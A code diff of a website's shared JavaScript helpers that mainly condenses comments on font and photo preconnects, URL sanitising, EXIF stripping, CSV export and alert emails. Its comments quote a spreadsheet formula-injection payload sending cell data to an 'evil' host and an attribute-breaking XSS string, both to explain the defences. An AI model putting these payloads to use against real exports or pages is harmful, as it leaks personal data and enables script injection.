+// trancar o dono fora do painel. Falha entra no registro de degradações
+// (SECURITY.md).
 /**
  * @param {Env} env
  * @param {string} ip
@@ -837,27 +723,13 @@ export function escape(str) {
     .replace(/'/g, '&#x27;');
 }
 
-// Shared footer block (legal links + copyright) reused across every public
-// page so the near-identical footers can't drift out of sync as new links get
-// added. The year is computed live — pages render per-request, so the
-// copyright is always current with no cron/build step needed. Callers
-// provide their own CSS for .legal-link/.footer-copyright (this only returns
-// markup, same contract as escape()/formatDatePT()). `extra` lets a specific
-// page fold one more low-key link into the same row (e.g. event.js's "Ver
-// tour novamente") instead of starting a second, more crowded row — kept out
-// of the default set since it's not relevant on every page. "Sugestões"
-// deliberately lives only in the dismissible update banner, not here — the
-// footer was getting crowded and this link doesn't need to be permanent.
-// "Privacidade" e "Termos" viraram um único link "Legal", que aponta para a
-// Central de Transparência (/legal) — de onde os dois continuam a um clique.
-// O rodapé estava com seis links competindo por atenção, e os dois jurídicos
-// eram justamente os que ninguém clica quando estão soltos ali.
-//
-// Isso NÃO reduz o acesso às políticas, ao contrário: a página de destino
-// mostra o resumo do que é feito com os dados, os prazos, os canais de contato
-// e a documentação de conformidade inteira — tudo que antes exigia saber onde
-// procurar. Um único link nomeado é também o padrão de quem trata conformidade
-// como algo a exibir, não a esconder.
+// Rodapé compartilhado por toda página pública, para não divergir conforme
+// links são adicionados. Ano calculado em runtime (páginas renderizam por
+// requisição, sem passo de build). `extra` deixa uma página específica somar
+// um link (ex.: "Ver tour novamente" em event.js) sem sobrecarregar a linha
+// padrão. "Privacidade"/"Termos" viraram um único link "Legal" -> /legal, de
+// onde os dois continuam a um clique — o rodapé tinha 6 links competindo por
+// atenção.
 export function footerLegalLinksHTML(extra = '') {
   const year = new Date().getFullYear();
   return `
@@ -916,47 +788,28 @@ export function updateBannerHTML() {
 // ---------------------------------------------------------------------------
 // Dicas de conexão para o Google Fonts — as DUAS, sempre juntas
 // ---------------------------------------------------------------------------
-// O Inter chega por dois hosts, não um: `fonts.googleapis.com` serve o CSS e
-// `fonts.gstatic.com` serve os WOFF2 que o `@font-face` daquele CSS aponta.
-// Todas as páginas daqui preconectavam só ao primeiro.
+// Inter vem de DOIS hosts: fonts.googleapis.com serve o CSS,
+// fonts.gstatic.com serve os WOFF2 que o @font-face daquele CSS aponta. Sem
+// preconnect aos dois, o browser só descobre o segundo host depois de baixar
+// e parsear o CSS — handshake serial atrasado, visível como FOUT com
+// display=swap (mais em rede móvel, onde o handshake dói mais).
 //
-// O que isso custa é uma cadeia SERIAL no caminho crítico: o browser só
-// descobre que existe um segundo host depois de baixar E parsear o CSS, e só
-// então começa DNS + TCP + TLS para ele. Ou seja, o handshake que o preconnect
-// existe para adiantar acontecia inteiro, tarde, com a renderização já em
-// andamento. Com `display=swap` no link do CSS, o sintoma visível é o texto
-// aparecer na fonte de fallback e trocar depois (FOUT) — em toda primeira
-// visita, e mais em rede móvel, onde o handshake é justamente o que dói.
+// `crossorigin` no link do gstatic não é enfeite: fonte é buscada em modo
+// CORS, e o browser usa pools de conexão separados para CORS/não-CORS — sem o
+// atributo a conexão não é reaproveitada e o handshake repete. O link do CSS
+// fica sem o atributo pelo motivo oposto (busca não-CORS).
 //
-// ⚠️ O `crossorigin` do segundo link NÃO é enfeite. Requisição de fonte é
-// feita em modo CORS (anônimo), e o browser mantém pools de conexão separados
-// para CORS e não-CORS: um preconnect sem o atributo abre a conexão errada, a
-// busca da fonte não a reaproveita e o handshake acontece de novo. O resultado
-// é pior do que não ter preconnect nenhum — uma conexão ociosa a mais e zero
-// ganho. O primeiro link fica sem o atributo pelo mesmo motivo, invertido: a
-// folha de estilo é buscada em modo não-CORS.
-//
-// Os dois saem de uma função só porque o modo de falha aqui é o esquecimento
-// pela metade — foi exatamente ele que produziu o estado anterior, repetido em
-// doze cabeçalhos. Uma página nova não consegue mais herdar meio par.
-//
-// Isto é remendo com prazo de validade: hospedar o Inter localmente (TODO.md)
-// apaga os dois hosts, a transferência internacional do IP do visitante e duas
-// origens da CSP de uma vez. Enquanto isso não acontece, o par é o certo.
+// Remendo temporário — hospedar o Inter localmente (TODO.md) elimina os dois
+// hosts de uma vez.
 export function fontPreconnectHTML() {
   return `<link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>`;
 }
 
-// Host de onde sai TODA foto do site — miniatura de card e foto de capa. A
-// página de projeto já preconectava aqui; a galeria não, e a galeria é quem
-// abre com dezenas de <img> deste host de uma vez, contra UMA na outra. Era a
-// inversão exata da prioridade: a dica estava na página que menos precisava
-// dela.
-//
-// Sem `crossorigin`, ao contrário da fonte: <img> sem o atributo é buscada em
-// modo não-CORS, e um preconnect anônimo abriria conexão no pool errado — a
-// busca da imagem não a reaproveitaria.
+// Host de onde sai TODA foto do site. A galeria abre dezenas de <img> daqui
+// de uma vez (contra uma só na página de projeto), então é aqui que o
+// preconnect importa mais. Sem `crossorigin`, ao contrário da fonte: <img>
+// busca em modo não-CORS.
 export function photoPreconnectHTML() {
   return '<link rel="preconnect" href="https://lh3.googleusercontent.com">';
 }
@@ -1038,20 +891,15 @@ export function toHttps(url) {
   return /^https:\/\//i.test(u) ? u : '';
 }
 
-// Render-time guard for values that land in an href/src. toHttps() already
-// sanitizes on write, but stored data can predate that (legacy KV rows) or
-// bypass it (a restored backup is merged verbatim), and escape() alone does
-// NOT stop `javascript:` inside an href — it only escapes the quotes around
-// it. Sanitizing again at the sink makes the page safe regardless of how the
-// value got into KV.
+// Render-time guard for href/src values. toHttps() sanitizes on write, but
+// stored data can predate that or bypass it (a restored backup merged
+// verbatim), and escape() alone does NOT stop `javascript:` in an href — it
+// only escapes the surrounding quotes.
 //
-// ATENÇÃO — isto é allowlist de ESQUEMA, não escape de HTML. O retorno é a URL
-// crua quando ela começa com https:, e uma URL válida pode conter aspas:
-// `https://x/" onload="alert(1)` passa inteiro por aqui. Ao interpolar dentro
-// de um atributo HTML, componha as duas: escape(safeUrl(x)) — safeUrl mata o
-// `javascript:`, escape mata a quebra de atributo. Nenhuma das duas sozinha
-// cobre os dois casos. Em atribuição de propriedade no cliente (el.href = x)
-// safeUrl basta, porque não há parsing de HTML envolvido.
+// ATENÇÃO — allowlist de ESQUEMA, não escape de HTML: a URL crua pode conter
+// aspas (`https://x/" onload="alert(1)`). Em atributo HTML componha as duas:
+// escape(safeUrl(x)) — safeUrl mata `javascript:`, escape mata a quebra de
+// atributo. Em atribuição de propriedade (el.href = x) safeUrl basta.
 /**
  * @param {unknown} url
  */
@@ -1062,19 +910,14 @@ export function safeUrl(url) {
 // ---------------------------------------------------------------------------
 // Remoção de metadados (EXIF/GPS/XMP) das imagens enviadas
 // ---------------------------------------------------------------------------
-// A foto que chega pelo formulário de remoção é enviada por e-mail ao admin
-// como anexo. Uma foto de celular carrega EXIF com coordenada de GPS, modelo do
-// aparelho, número de série e data/hora exata. Ou seja: alguém que escreve
-// pedindo para *sumir* de uma foto acaba nos entregando, de brinde, onde a foto
-// foi tirada. Isso é o oposto do pedido, e não é dado de que precisamos para
-// atender a solicitação — o que a LGPD chama de minimização (art. 6º, III).
+// Foto de celular carrega GPS, modelo do aparelho, serial e data/hora no EXIF
+// — o oposto do que alguém pedindo para SUMIR de uma foto quer entregar de
+// brinde no e-mail ao admin (minimização, LGPD art. 6º, III).
 //
-// A limpeza acontece no servidor, antes do anexo existir. Só JPEG, PNG e WebP
-// são tratados: são os três formatos onde a remoção é uma poda de contêiner
-// (dropar segmentos/chunks), sem recodificar o pixel. HEIC/AVIF/GIF passam
-// intactos — o EXIF neles vive dentro de caixas ISO-BMFF e mexer ali sem um
-// decodificador de verdade corre o risco de corromper a prova que o titular
-// mandou. Preferimos entregar a foto legível e registrar a limitação.
+// Limpeza no servidor, antes do anexo existir. Só JPEG/PNG/WebP: são os
+// formatos onde dá para podar contêiner (dropar segmentos/chunks) sem
+// recodificar o pixel. HEIC/AVIF/GIF passam intactos — o EXIF vive em caixas
+// ISO-BMFF, e mexer sem decodificador de verdade arrisca corromper a prova.
 
 // Segmentos JPEG que carregam metadado, não imagem:
 // APP1 (EXIF/XMP), APP2 (ICC/FlashPix), APP13 (IPTC/Photoshop) e o comentário.
@@ -1198,10 +1041,9 @@ export function base64FromBytes(bytes) {
   return btoa(bin);
 }
 
-// Devolve { base64, stripped, format }. Qualquer imprevisto (formato não
-// suportado, estrutura inesperada, erro de decodificação) devolve o original
-// com stripped=false: perder o anexo do titular seria pior do que manter o
-// metadado, e o resultado fica registrado para quem revisa o pedido.
+// Devolve { base64, stripped, format }. Qualquer imprevisto devolve o
+// original com stripped=false: perder o anexo do titular seria pior do que
+// manter o metadado, e o resultado fica registrado para quem revisa o pedido.
 /**
  * @param {string} b64
  */
@@ -1217,10 +1059,8 @@ export function stripImageMetadata(b64) {
     if (bytes[0] === 0xFF && bytes[1] === 0xD8) { format = 'jpeg'; cleaned = stripJpeg(bytes); }
     else if (bytes[0] === 0x89 && bytes[1] === 0x50) { format = 'png'; cleaned = stripPng(bytes); }
     else if (String.fromCharCode(bytes[0], bytes[1], bytes[2], bytes[3]) === 'RIFF') { format = 'webp'; cleaned = stripWebp(bytes); }
-    // Os que sabemos NOMEAR mas não limpar. Reconhecê-los não os aceita — o
-    // chamador recusa tudo que volta com stripped:false. É só para a recusa
-    // dizer "(heic)" em vez de "(unknown)": quem recebe a mensagem precisa
-    // saber qual arquivo converter, e "unknown" não ajuda ninguém a agir.
+    // Reconhecidos mas não limpos — não os aceita (o chamador recusa todo
+    // stripped:false), só deixa a recusa dizer "(heic)" em vez de "(unknown)".
     else if (String.fromCharCode(bytes[4], bytes[5], bytes[6], bytes[7]) === 'ftyp') {
       const marca = String.fromCharCode(...bytes.slice(8, 12)).toLowerCase();
       format = marca.startsWith('avif') ? 'avif' : 'heic';
@@ -1260,24 +1100,14 @@ export function isLikelyImage(b64) {
 
 // CSV export helpers (shared by the consent / removal / metrics exports).
 //
-// INJEÇÃO DE FÓRMULA — o motivo de este arquivo não ser trivial. O export de
-// consentimentos carrega campos que quem visita o site controla por inteiro:
-// `consenter_name` (digitado no gate do Drive), `user_agent` e `referrer`
-// (cabeçalhos crus). Excel, LibreOffice e Google Sheets tratam uma célula que
-// começa com `=`, `+`, `-`, `@`, TAB ou CR como fórmula e a executam ao abrir o
-// arquivo. Um nome como
+// INJEÇÃO DE FÓRMULA — o motivo de este arquivo não ser trivial. Campos como
+// `consenter_name`, `user_agent`, `referrer` vêm crus do visitante. Excel/
+// Sheets tratam uma célula começando com `=`,`+`,`-`,`@`,TAB,CR como fórmula e
+// executam ao abrir — ex.: `=HYPERLINK("https://evil/?x="&A1,"clique")`. Aspas
+// de CSV não bloqueiam isso (são citação, não escape de fórmula); a execução
+// roda no computador do admin, com os dados pessoais abertos na tela.
 //
-//     =HYPERLINK("https://evil/?x="&A1,"clique")
-//
-// atravessa aspas de CSV sem problema (aspas são citação, não escape de
-// fórmula) e roda na planilha de quem exporta — ou seja, no computador do
-// admin, com o arquivo inteiro de dados pessoais aberto na frente. É uma
-// execução no cliente que nenhuma proteção do site alcança, porque acontece
-// depois do download.
-//
-// A defesa é prefixar com apóstrofo, que a planilha consome como "isto é
-// texto". Combinada com a citação normal do CSV, o valor continua legível e
-// deixa de ser executável.
+// Defesa: prefixar com apóstrofo, que a planilha lê como "isto é texto".
 const CSV_FORMULA_PREFIX = /^[-=+@\t\r]/;
 
 /**
@@ -1286,9 +1116,8 @@ const CSV_FORMULA_PREFIX = /^[-=+@\t\r]/;
 export function csvCell(v) {
   if (v === null || v === undefined) return '';
   let s = String(v);
-  // Antes de qualquer coisa: caracteres de controle fora. Eles não são dado
-  // legítimo em nenhuma das colunas exportadas e são exatamente o que dá para
-  // usar para forjar a estrutura do arquivo.
+  // Caracteres de controle fora, antes de tudo — não são dado legítimo e dão
+  // para forjar a estrutura do arquivo.
   // eslint-disable-next-line no-control-regex
   s = s.replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, '');
   if (CSV_FORMULA_PREFIX.test(s)) s = "'" + s;
@@ -1453,13 +1282,11 @@ export async function sendSupportEmail(env, { name, email, message }) {
   return true;
 }
 
-// Fire-and-forget alert to the site owner when an unhandled exception reaches
-// the top-level fetch() catch — a tripwire so an outage/bug is noticed without
-// watching logs. Deliberately never throws (called via ctx.waitUntil(...).catch
-// as a last-resort safety net; a failure here must never cascade) and never
-// includes request bodies/headers/IP — only the error message, a truncated
-// stack, and the route — to avoid ever incidentally mailing visitor PII.
-// Global cooldown (not per-error) so a repeating throw can't flood the inbox.
+// Fire-and-forget alert when an unhandled exception reaches the top-level
+// fetch() catch — a tripwire so an outage/bug is noticed without watching
+// logs. Never throws (called via ctx.waitUntil(...).catch) and never includes
+// request bodies/headers/IP — only error message, truncated stack, and route
+// — to avoid ever mailing visitor PII. Global cooldown, not per-error.
 /**
  * @param {Env} env
  * @param {unknown} err
@@ -1512,16 +1339,13 @@ export async function sendErrorAlert(env, err, context = {}) {
   }
 }
 
-// Alerta de tentativas de login falhas. Sem isso, um ataque de força bruta
-// contra /dashboard/login é completamente silencioso: o rate limit segura o
-// volume, mas ninguém fica sabendo que houve tentativa — e "não fui avisado" é
-// a diferença entre trocar a senha hoje e descobrir daqui a seis meses.
+// Alerta de tentativas de login falhas — sem isso, um ataque de força bruta a
+// /dashboard/login é silencioso: o rate limit segura o volume, mas ninguém
+// fica sabendo que houve tentativa.
 //
-// Mesmo contrato do sendErrorAlert: nunca lança (é chamado por waitUntil), tem
-// cooldown próprio para não virar flood, e não carrega corpo de requisição.
-// O IP entra truncado — é dado de segurança legítimo (art. 7º, IX + art. 16, I
-// da LGPD, registro para exercício regular de direito), mas não precisa de
-// precisão total num e-mail.
+// Mesmo contrato do sendErrorAlert: nunca lança, cooldown próprio, sem corpo
+// de requisição. IP entra truncado — dado de segurança legítimo (LGPD art. 7º,
+// IX + art. 16, I) mas sem precisão total num e-mail.
 const LOGIN_ALERT_COOLDOWN_SECS = 1800;
 
 /**
@@ -1620,18 +1444,14 @@ export async function sendConfirmationEmail(env, req) {
 // já dá volume de sobra para medir tendência sem competir com o tráfego real.
 const PERF_SAMPLE_RATE = 0.1;
 
-// Script que sobe no <head> — precisa existir antes das <img> serem parseadas,
-// senão uma imagem já em cache dispara onload antes de imgSettled existir e o
-// shimmer fica girando para sempre sobre uma foto que já chegou.
+// Script no <head>: precisa existir antes das <img> serem parseadas, senão
+// uma imagem já em cache dispara onload antes de imgSettled existir e o
+// shimmer gira para sempre. Duração vem de Resource Timing do próprio
+// browser — cross-origin (fotos são do Google) zera os tempos detalhados sem
+// Timing-Allow-Origin, mas `duration` continua exposto.
 //
-// A duração de cada imagem NÃO é medida à mão: o próprio browser registra isso
-// em Resource Timing. Para recursos cross-origin (as fotos vêm do Google) os
-// tempos detalhados ficam zerados sem Timing-Allow-Origin, mas `duration`
-// continua exposto — que é exatamente o número que queremos.
-//
-// Um único beacon por visita, no visibilitychange. Um POST por imagem custaria
-// uma requisição de Worker por foto e transformaria a galeria de 12 cards em 13
-// requisições — o mesmo problema de cota que fez o cache via Worker ser descartado.
+// Um beacon por visita (visibilitychange), não por imagem — evitaria repetir
+// o mesmo problema de cota que descartou o cache via Worker.
 /**
  * @param {string} page
  * @param {boolean} enabled
